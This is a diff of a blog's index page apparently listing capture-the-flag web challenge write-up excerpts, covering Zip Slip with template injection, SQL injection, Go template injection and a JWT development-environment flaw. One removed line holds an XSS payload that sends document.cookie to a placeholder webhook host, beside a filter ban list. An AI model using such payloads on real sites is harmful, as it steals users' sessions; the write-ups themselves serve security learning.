@@ -159,6 +159,43 @@
 
 <article class="post-entry"> 
 <figure class="entry-cover">
+        <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-writeup.jpg" alt="DreamHack - 거북이">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">DreamHack - 거북이 Web Challenge Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Room / Challenge: 거북이 (Web)
+Metadata Author: jameskaois CTF: DreamHack Challenge: 거북이 (web) Link: https://dreamhack.io/wargame/challenges/2194 Level: 2 Date: 25-11-2025 Goal Leveraging Zip Slip vulnerability and get the flag.
+My Solution The app is vulnerable to Zip Slip vulnerability, the vulnerable block of code in /upload:
+if (f.filename or &#34;&#34;).lower().endswith(&#34;.zip&#34;) or &#34;zip&#34; in (f.content_type or &#34;&#34;).lower(): data = f.read() zf = zipfile.ZipFile(io.BytesIO(data)) names = [] for info in zf.infolist(): target = UPLOAD_DIR / info.filename # &lt;--- VULNERABLE CODE HERE if info.is_dir(): target.mkdir(parents=True, exist_ok=True) else: target.parent.mkdir(parents=True, exist_ok=True) with zf.open(info) as src, open(target, &#34;wb&#34;) as dst: shutil.copyfileobj(src, dst) names.append(info.filename) return jsonify(ok=True, saved=names) The app doesn’t have any filetering or sanitizing so if we upload with a file with name ../templates/test.html, it will replace the test.html in templates folder with our file, then since this is a Flask app, we can use SSTI to get the flag content.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-11-25 16:12:08 +0700 +07'>November 25, 2025</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to DreamHack - 거북이 Web Challenge Writeup" href="http://localhost:1313/posts/dreamhack-%EA%B1%B0%EB%B6%81%EC%9D%B4-web-challenge-writeup/"></a>
+</article>
+
+<article class="post-entry"> 
+<figure class="entry-cover">
+        <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-writeup.jpg" alt="DreamHack - I wish A grade">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">DreamHack - I wish A grade Web Challenge Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Room / Challenge: I wish A grade (Web)
+Metadata Author: jameskaois CTF: DreamHack Challenge: I wish A grade (web) Link: https://dreamhack.io/wargame/challenges/2380 Level: 2 Date: 25-11-2025 Goal Follow the hints, leverage SQL Injection to get the flag.
+My Solution Based on the readme.txt got we can tried logging in as 202511037 to see what we got. After some time examining the website, I found a hidden announcements which is in /announce/1:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-11-25 15:45:16 +0700 +07'>November 25, 2025</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to DreamHack - I wish A grade Web Challenge Writeup" href="http://localhost:1313/posts/dreamhack-i-wish-a-grade-web-challenge-writeup/"></a>
+</article>
+
+<article class="post-entry"> 
+<figure class="entry-cover">
         <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-writeup.jpg" alt="DreamHack - I LOVE XSS!">
 </figure>
   <header class="entry-header">
@@ -166,11 +203,11 @@
     </h2>
   </header>
   <div class="entry-content">
-    <p>Goal Leveraging XSS Scriptin to get the flag.
+    <p> Room / Challenge: I LOVE XSS! (Web)
+Metadata Author: jameskaois CTF: DreamHack Challenge: I LOVE XSS! (web) Link: https://dreamhack.io/wargame/challenges/2061 Level: 2 Date: 25-11-2025 Goal Leveraging XSS Scriptin to get the flag.
 My Solution The app has a banned list for XSS Scripting:
 banlist = [&#34;`&#34;,&#34;&#39;&#34;,&#34;alert(&#34;,&#34;fetch(&#34;,&#34;replace(&#34;,&#34;[&#34;,&#34;]&#34;,&#34;javascript&#34;,&#34;@&#34;,&#34;!&#34;,&#34;%&#34;,&#34;location&#34;,&#34;href&#34;,&#34;window&#34;,&#34;eval&#34;] Also in sanitizer.py it do allow &lt;script&gt; tag however no any attributes is allowed:
 import bleach ALLOWED_TAGS = [&#39;script&#39;] #I only love script tags! ALLOWED_ATTRIBUTES = {} ALLOWED_PROTOCOLS = [&#39;http&#39;, &#39;https&#39;] def sanitize_input(user_input: str) -&gt; str: return bleach.clean( user_input, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, protocols=ALLOWED_PROTOCOLS, strip=True, strip_comments=True ) Initially, I create a payload:
-&lt;script&gt;document.write(&#34;\x3cimg src=\&#34;https://YOUR_WEBHOOK/webhook?c=&#34;&#43;document.cookie&#43;&#34;\&#34;\x3e&#34;)&lt;/script&gt; \x3c and \x3e is HEX code of &lt; and &gt; and used \&#34; because &#39; single quote is banned. However &#43; is treated as space in URL Encoded so I use concat instead:
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2025-11-25 15:15:11 +0700 +07'>November 25, 2025</span>&nbsp;·&nbsp;<span>1 min</span></footer>
@@ -308,44 +345,6 @@ Question #3: What show does Jim reference in his review? =&gt; Answer: Star Trek
   <footer class="entry-footer"><span title='2025-11-21 09:32:03 +0700 +07'>November 21, 2025</span>&nbsp;·&nbsp;<span>2 min</span></footer>
   <a class="entry-link" aria-label="post link to TryHackMe - OWASP Juice Shop Room Walkthrough" href="http://localhost:1313/posts/tryhackme-owasp-juice-shop-room-walkthrough/"></a>
 </article>
-
-<article class="post-entry"> 
-<figure class="entry-cover">
-        <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-writeup.jpg" alt="DreamHack - Hello, go!">
-</figure>
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">DreamHack - Hello, Go! Web Challenge Write-up
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> Room / Challenge: Hello, go! (Web)
-Metadata Author: jameskaois CTF: DreamHack Challenge: Hello, go! (web) Link: https://dreamhack.io/wargame/challenges/1999 Level: 2 Date: 20-11-2025 Goal Leveraging SSTI in Go template and get the flag.
-My Solution The app.go has a vulnerable code in how it renders our input:
-t, err := template.New(&#34;page&#34;).Parse( fmt.Sprintf(` &lt;html&gt; &lt;body&gt; &lt;h1&gt;Hello, %s!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;`, name)) The server gets our input and render it to the template, then it executes:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-11-20 21:23:42 +0700 +07'>November 20, 2025</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to DreamHack - Hello, Go! Web Challenge Write-up" href="http://localhost:1313/posts/dreamhack-hello-go-web-challenge-writeup/"></a>
-</article>
-
-<article class="post-entry"> 
-<figure class="entry-cover">
-        <img loading="lazy" src="http://localhost:1313/images/posts/dreamhack-development-env.jpg" alt="DreamHack - development-env">
-</figure>
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">DreamHack - development-env Web Challenge Write-up
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> Room / Challenge: development-env (Web)
-Metadata Author: jameskaois CTF: DreamHack Challenge: development-env (web) Link: https://dreamhack.io/wargame/challenges/783 Level: 2 Date: 20-11-2025 Goal The development environment source code is deployed in production, leverage this to get the flag.
-My Solution The source code has 2 main routes /validate, /:
-app.get(&#39;/&#39;, async (req, res) =&gt; { try { let token = req.cookies.auth || &#39;&#39;; const payloadData = await cryptolib.readJWT(token, &#39;FAKE_KEY&#39;); if (payloadData) { userflag = payloadData[&#39;uid&#39;] == &#39;admin&#39; ? flag : &#39;You are not admin&#39;; res.render(&#39;main&#39;, { username: payloadData[&#39;uid&#39;], flag: userflag }); } else { res.render(&#39;login&#39;); } } catch (e) { if (isDevelopmentEnv) { res.json(JSON.parse(parsetrace(e, { sources: true }).json())); } else { res.json({ message: &#39;error&#39; }); } } }); app.post(&#39;/validate&#39;, async (req, res) =&gt; { try { let contentType = req.header(&#39;Content-Type&#39;).split(&#39;;&#39;)[0]; if ( [&#39;multipart/form-data&#39;, &#39;application/x-www-form-urlencoded&#39;].indexOf(contentType) === -1 ) { throw new Error(&#39;content type not supported&#39;); } else { let bodyKeys = Object.keys(req.body); if (bodyKeys.indexOf(&#39;id&#39;) === -1 || bodyKeys.indexOf(&#39;pw&#39;) === -1) { throw new Error(&#39;missing required parameter&#39;); } else { if ( typeof database[req.body[&#39;id&#39;]] !== &#39;undefined&#39; &amp;&amp; database[req.body[&#39;id&#39;]] === req.body[&#39;pw&#39;] ) { if ( req.get(&#39;User-Agent&#39;).indexOf(&#39;MSIE&#39;) &gt; -1 || req.get(&#39;User-Agent&#39;).indexOf(&#39;Trident&#39;) &gt; -1 ) throw new Error(&#39;IE is not supported&#39;); jwt = await cryptolib.generateJWT(req.body[&#39;id&#39;], &#39;FAKE_KEY&#39;); res.cookie(&#39;auth&#39;, jwt, { maxAge: 30000, }).send(&#34;&lt;script&gt;alert(&#39;success&#39;);document.location.href=&#39;/&#39;&lt;/script&gt;&#34;); } else { res.json({ message: &#39;error&#39;, detail: &#39;invalid id or password&#39; }); } } } } catch (e) { if (isDevelopmentEnv) { res.status(500).json({ message: &#39;devError&#39;, detail: JSON.parse(parsetrace(e, { sources: true }).json()), }); } else { res.json({ message: &#39;error&#39;, detail: e }); } } }); Based on the description, it is a hint that the development source code is published to production. We can find that vulnerable code:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-11-20 09:59:14 +0700 +07'>November 20, 2025</span>&nbsp;·&nbsp;<span>3 min</span></footer>
-  <a class="entry-link" aria-label="post link to DreamHack - development-env Web Challenge Write-up" href="http://localhost:1313/posts/dreamhack-development-env-web-challenge-writeup/"></a>
-</article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="next" href="http://localhost:1313/posts/page/2/">Next&nbsp;&nbsp;»
@@ -363,15 +362,15 @@ app.get(&#39;/&#39;, async (req, res) =&gt; { try { let token = req.cookies.auth
         <h2>Recently Added</h2>
 
         
+        <div><a href="http://localhost:1313/posts/dreamhack-%EA%B1%B0%EB%B6%81%EC%9D%B4-web-challenge-writeup/">DreamHack - 거북이 Web Challenge Writeup</a></div>
+        
+        <div><a href="http://localhost:1313/posts/dreamhack-i-wish-a-grade-web-challenge-writeup/">DreamHack - I wish A grade Web Challenge Writeup</a></div>
+        
         <div><a href="http://localhost:1313/posts/dreamhack-i-love-xss-web-challenge-writeup/">DreamHack - I LOVE XSS! Web Challenge Writeup</a></div>
         
         <div><a href="http://localhost:1313/posts/dreamhack-test-site-web-challenge-writeup/">DreamHack - Test site Web Challenge Writeup</a></div>
         
         <div><a href="http://localhost:1313/posts/dreamhack-special-letter-translator-web-challenge-writeup/">DreamHack - Special Letter Translator Web Challenge Writeup</a></div>
-        
-        <div><a href="http://localhost:1313/posts/patriot-ctf-2025-web-challenges-writeups/">Patriot CTF 2025 - Web Challenges Writeups</a></div>
-        
-        <div><a href="http://localhost:1313/posts/dreamhack-black-hacker-company-web-challenge-writeup/">DreamHack - Black-Hacker-Company Web Challenge Write-up</a></div>
         
     </section>
 
